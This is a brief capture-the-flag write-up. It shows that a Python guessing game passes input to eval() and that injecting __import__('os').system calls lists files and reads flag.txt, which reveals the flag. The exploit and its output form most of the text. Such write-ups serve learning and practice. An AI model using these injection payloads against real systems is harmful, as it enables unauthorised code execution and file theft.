The primary vulnerability in this challenge is the use of eval(). This function allows arbitrary code execution, which can be exploited to bypass the need to guess the number. 

Since eval() executes the input as code, we can input python code that reads and prints the
flag directly, bypassing the number guessing logic

First we can input ```__import__('os').system('ls')```
We get:
```What is the number?: __import__('os').system('ls')                    
chall.py
flag.txt

You lost lol
```
Then we input ```__import__('os').system('cat flag.txt')```
We get:
```wctf{Why_Gu3ss_Wh3n_Y0u_C4n_CH34T}
You lost lol```

Flag is: ```wctf{Why_Gu3ss_Wh3n_Y0u_C4n_CH34T}```
